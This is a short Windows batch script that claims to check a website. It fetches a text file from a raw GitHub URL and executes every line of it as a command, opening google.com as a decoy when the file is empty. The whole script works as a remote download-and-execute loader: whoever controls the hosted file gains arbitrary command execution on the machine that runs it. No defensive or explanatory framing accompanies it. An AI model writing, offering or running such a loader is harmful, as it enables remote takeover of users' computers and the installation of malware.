
@echo off
setlocal

set "URL=https://raw.githubusercontent.com/animationss253/magarni/main/run.txt"

echo Checking website...

curl.exe -fsSL --max-time 15 "%URL%" | findstr /r "." >nul

if errorlevel 1 (
    echo Website unavailable or empty.
    start "" "https://google.com"
    goto :end
)

echo Website loaded successfully.
echo Executing remote commands...

for /f "usebackq delims=" %%A in (`curl.exe -fsSL --max-time 15 "%URL%"`) do (
    call %%A
)

:end
endlocal
